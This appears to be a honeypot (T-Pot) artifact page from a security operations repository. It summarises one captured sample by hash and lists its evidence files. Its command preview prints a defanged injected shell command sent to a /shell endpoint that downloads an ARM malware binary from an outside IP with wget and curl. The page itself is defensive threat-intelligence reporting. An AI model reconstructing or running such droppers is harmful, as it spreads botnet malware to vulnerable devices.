# cf3fe5d2b21fb326de5d4b3561d6fdfe5073dba64c24a95c30a26b691c93dd8f

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `cf3fe5d2b21fb326de5d4b3561d6fdfe5073dba64c24a95c30a26b691c93dd8f` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /shell?cd/tmp||cd/var/run||cd/mnt||cd/root||cd/; wget hxxp://94[.]154[.]43[.]XXX/nz/nz.arm7; curl -O hxxp://94[.]154[.]43[.]XXX/
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
